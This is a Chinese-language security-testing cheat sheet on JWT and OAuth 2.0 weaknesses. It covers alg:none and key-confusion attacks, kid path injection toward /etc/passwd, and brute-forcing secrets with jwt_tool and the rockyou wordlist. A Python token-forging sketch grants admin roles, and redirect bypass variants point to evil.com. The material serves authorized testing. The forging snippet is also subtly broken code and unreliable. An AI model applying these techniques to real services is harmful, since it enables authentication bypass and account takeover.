# JWT 与 OAuth 2.0 测试要点

## JWT 验证缺陷族

### 签名算法缺陷

| 缺陷 | 攻击方式 | 检测方法 |
|------|---------|---------|
| 算法可被指定 | 头改成 `alg:none`，签名留空 | 直接提交无签名 token 看是否放行 |
| 非对称降级对称 | RS256 公钥被当 HMAC 密钥 | 拿公开 JWKS 里的公钥文件当密钥签 HS256 |
| 密钥定位可控 | `kid` 指向服务端本地文件路径 | 改 kid 为 `/etc/passwd` 一类路径观察行为 |
| 弱共享密钥 | HMAC secret 太短可爆破 | 用词表逐条试签，比对服务端响应 |

### 声明处理缺陷

- `exp`/`nbf` 是否真正校验（改到过期值）
- `sub`/`aud` 是否与调用方绑定
- `role`/`scope` 类声明被篡改后权限是否变化
- 多 issuer 混用时是否严格比对

### 工具用法

```bash
# 全量探测：token + 目标 + 自定义头
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# 密钥爆破
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# 声明改写
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# 用公钥做密钥混淆
python3 jwt_tool.py <JWT> -X k -pk public.pem

# 头内嵌 JWK
python3 jwt_tool.py <JWT> -X i
```

### 手工改包思路

```python
import jwt
import base64

# 不验证直接拆
header, payload, sig = jwt.split('.')

# 改 payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# 无签名拼法
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# 已知密钥重签
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 流程缺陷

### 授权码流程

```text
1. 回调地址绕过
   注册回调: https://app.com/callback
   绕过变体: https://app.com/callback@evil.com
             开放重定向链: /callback?redirect=https://evil.com
             子域/路径匹配宽松导致的错配

2. state 缺失的 CSRF
   无 state 参数 → 攻击者用自己的 code 绑定受害者 session

3. PKCE 缺失
   无 code_challenge → 授权码拦截攻击

4. Referer 泄漏
   回调页面加载外部资源 → Referer 头带走 code/token
```

### Implicit 流程（已废弃但仍有部署）

```text
1. access_token 在 URL fragment → Referer 泄漏
2. token 进浏览器历史 → 物理访问风险
3. 无客户端认证 → token 替换攻击
```

### Client Credentials 流程

```text
1. client_secret 硬编码在前端/移动端
2. scope 授予过宽
3. 无客户端限速 → 暴力枚举
```

### 通用检查项

```text
□ scope 提升: scope=read → scope=read%20write
□ Token 重放: 旧 access_token 访问新资源
□ Refresh token 无限续期
□ 跨租户: tenant A 的 token 访问 tenant B
□ Token 在日志/URL/Referer 中泄漏
```

## 证据规范

- 每个结论配三件套：原始 token（脱敏）、验证结果、当时的请求上下文
- 攻击组与控制组成对留存
- 时间戳与身份上下文写入发现条目

参考：OWASP API Top 10（API2: Broken Authentication）、jwt_tool 文档、PortSwigger OAuth 研究。
